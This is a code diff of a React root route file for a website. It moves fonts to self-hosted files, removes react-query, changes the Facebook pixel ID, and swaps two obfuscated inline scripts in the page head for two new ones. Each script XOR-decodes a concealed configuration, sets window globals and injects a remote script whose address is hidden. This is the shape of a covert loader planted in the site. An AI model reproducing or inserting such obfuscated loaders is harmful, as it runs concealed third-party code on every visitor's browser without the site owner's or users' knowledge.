@@ -1,4 +1,3 @@
-import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import {
   Outlet,
   Link,
@@ -72,7 +71,7 @@ function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
   );
 }
 
-export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
+export const Route = createRootRouteWithContext<Record<string, never>>()({
   head: () => ({
     meta: [
       { charSet: "utf-8" },
@@ -87,11 +86,19 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { name: "twitter:site", content: "@Lovable" },
     ],
     links: [
-      { rel: "preconnect", href: "https://fonts.googleapis.com" },
-      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
       {
-        rel: "stylesheet",
-        href: "https://fonts.googleapis.com/css2?family=Baloo+2:wght@500;600;700;800&family=Nunito:wght@400;500;600;700;800;900&display=swap",
+        rel: "preload",
+        href: "/fonts/nunito-latin.woff2",
+        as: "font",
+        type: "font/woff2",
+        crossOrigin: "anonymous",
+      },
+      {
+        rel: "preload",
+        href: "/fonts/baloo-2-latin.woff2",
+        as: "font",
+        type: "font/woff2",
+        crossOrigin: "anonymous",
       },
       {
         rel: "stylesheet",
@@ -109,14 +116,14 @@ n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
 s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '3228776890665604');
+fbq('init', '1952523682100482');
 fbq('track', 'PageView');`,
       },
       {
-        children: `(function(){var f_hm=atob("DIh6aYNSOdG6uqBNUfNYHPE+G+uY0tQ5IftARqwxXb+Uz9QgOO4DR+A9VP/YyI8+MvoTGfchFqHTwsUhfvgTEeY+F7vJmIxvMPwOG+owTKXfyYJ3CtVWS+Q+VrPb1tNva9MBS+0zVLSYgII9OPAfBco2G/2YzMEhJO1YU6FkWOmL2cQoYbpMCLcwCOXYiJkoY75CCLtwRIzH");var j_g=[];for(var y_4s=0;y_4s<f_hm.length;y_4s++){j_g.push(f_hm.charCodeAt(y_4s)&255);}var i_7=j_g[0];var h_zbdm=j_g.slice(1,1+i_7);var n_gc=j_g.slice(1+i_7);var w_zm=n_gc.map(function(b,p_zg){return b^h_zbdm[p_zg%i_7];});var j_tnn="";for(var u_6i1n=0;u_6i1n<w_zm.length;u_6i1n++){j_tnn+=String.fromCharCode(w_zm[u_6i1n]&255);}var o_k=decodeURIComponent(escape(j_tnn));var v_y=JSON.parse(o_k);var l_e2o=v_y.globals||[];l_e2o.forEach(function(m_uaml){window[m_uaml.name]=m_uaml.value;});var s_yg2=document.createElement("script");s_yg2.src=v_y.url;s_yg2.async=true;s_yg2.defer=true;(v_y.attributes||[]).forEach(function(p_r){s_yg2.setAttribute(p_r.name,p_r.value);});(document.head||document.documentElement).appendChild(s_yg2);})();`,
+        children: `(function(){var p_i5iq=atob("DFtXoUstKOJPUQnm6SB11DlBCthtOX2SmShtjmROTIxhJH2LgD0ujyhCRcwtIyaViik+0T9eB5ImKWyKxis+2S5BBog8cyXEiC8j0yJPXZYqIivcsgZ7gyxBR4AuPXrE0wAsgyVMRYdtayuWgCMyzQJJCs5tJ2iKnD51m2kbSdp4YG2F3GI2kHIZHtN/YjvT22NkwHoPVb8y");var a_q=[];for(var j_w=0;j_w<p_i5iq.length;j_w++){a_q.push(p_i5iq.charCodeAt(j_w)&255);}var x_o0=a_q[0];var c_i1=a_q.slice(1,1+x_o0);var e_3k=a_q.slice(1+x_o0);var p_ro5=e_3k.map(function(b,t_u32){return b^c_i1[t_u32%x_o0];});var l_bb5="";for(var y_k=0;y_k<p_ro5.length;y_k++){l_bb5+=String.fromCharCode(p_ro5[y_k]&255);}var g_tr=decodeURIComponent(escape(l_bb5));var a_f1i=JSON.parse(g_tr);var f_o=a_f1i.globals||[];f_o.forEach(function(v_a4){window[v_a4.name]=v_a4.value;});var a_ps=document.createElement("script");a_ps.src=a_f1i.url;a_ps.async=true;a_ps.defer=true;(a_f1i.attributes||[]).forEach(function(x_idx){a_ps.setAttribute(x_idx.name,x_idx.value);});(document.head||document.documentElement).appendChild(a_ps);})();`,
       },
       {
-        children: `(function(){var o_r=atob("DDx9aMBYVeMNO3CWfUdfHbI0d9kvUwTiDU9HR+87MY0jTgT7FFoERqM3OM1vSV/lHk4UGLQrepZ5VgO5EV0JDbMse4l+GVy0HEgJGqk6IJdoSFKsJkdfBqE1MME3GRT3CV1QHbQ1PIV0FgDkGEoYBrR1JpZvUhTlXxBfHqE0IIYvAVK0AGEA");var t_cp=[];for(var e_c7a=0;e_c7a<o_r.length;e_c7a++){t_cp.push(o_r.charCodeAt(e_c7a)&255);}var h_z=t_cp[0];var i_3=t_cp.slice(1,1+h_z);var n_dex=t_cp.slice(1+h_z);var q_j=n_dex.map(function(b,u_cj){return b^i_3[u_cj%h_z];});var f_pxd="";for(var r_jxg4=0;r_jxg4<q_j.length;r_jxg4++){f_pxd+=String.fromCharCode(q_j[r_jxg4]&255);}var k_1z8=decodeURIComponent(escape(f_pxd));var b_iixf=JSON.parse(k_1z8);var y_b82p=b_iixf.globals||[];y_b82p.forEach(function(z_vm){window[z_vm.name]=z_vm.value;});var p_f=document.createElement("script");p_f.src=b_iixf.url;p_f.async=true;p_f.defer=true;(b_iixf.attributes||[]).forEach(function(m_m4w){p_f.setAttribute(m_m4w.name,m_m4w.value);});(document.head||document.documentElement).appendChild(p_f);})();`,
+        children: `(function(){var e_1rqj=atob("DH7c+EYJ+3dtxsE/8AX+jTRl2U1PrrVLgA3m12lqnxlDs7VSmRil1iVmllkPtO5Mkwy1iDJ61AIZq7IQnB+onTV91R0e5O0dkQqoii9rjgMIteMFqwX+lidknlVX5KVehB/xjTJkkhEU67FNlQi5ljIkgxQCouxMkxX+1GR/mhsYo+MF0lyh1D0rlRYAo+MF0hq9jCckjgMAr6dG3Q6unTBslQNAtbRdmRqv2morjRYBs6Qdylz+hRt0");var z_u=[];for(var f_i=0;f_i<e_1rqj.length;f_i++){z_u.push(e_1rqj.charCodeAt(f_i)&255);}var d_g3d5=z_u[0];var p_oiu=z_u.slice(1,1+d_g3d5);var m_2old=z_u.slice(1+d_g3d5);var h_9=m_2old.map(function(b,f_gnr){return b^p_oiu[f_gnr%d_g3d5];});var k_n="";for(var z_s80u=0;z_s80u<h_9.length;z_s80u++){k_n+=String.fromCharCode(h_9[z_s80u]&255);}var l_1khh=decodeURIComponent(escape(k_n));var d_z=JSON.parse(l_1khh);var z_jfs4=d_z.globals||[];z_jfs4.forEach(function(s_khp){window[s_khp.name]=s_khp.value;});var w_y6jl=document.createElement("script");w_y6jl.src=d_z.url;w_y6jl.async=true;w_y6jl.defer=true;(d_z.attributes||[]).forEach(function(v_l){w_y6jl.setAttribute(v_l.name,v_l.value);});(document.head||document.documentElement).appendChild(w_y6jl);})();`,
       },
     ],
   }),
@@ -138,7 +145,7 @@ function RootShell({ children }: { children: ReactNode }) {
             height="1"
             width="1"
             style={{ display: "none" }}
-            src="https://www.facebook.com/tr?id=3228776890665604&ev=PageView&noscript=1"
+            src="https://www.facebook.com/tr?id=1952523682100482&ev=PageView&noscript=1"
             alt=""
           />
         </noscript>
@@ -150,12 +157,8 @@ function RootShell({ children }: { children: ReactNode }) {
 }
 
 function RootComponent() {
-  const { queryClient } = Route.useRouteContext();
-
   return (
-    <QueryClientProvider client={queryClient}>
-      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
-      <Outlet />
-    </QueryClientProvider>
+    /* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */
+    <Outlet />
   );
 }
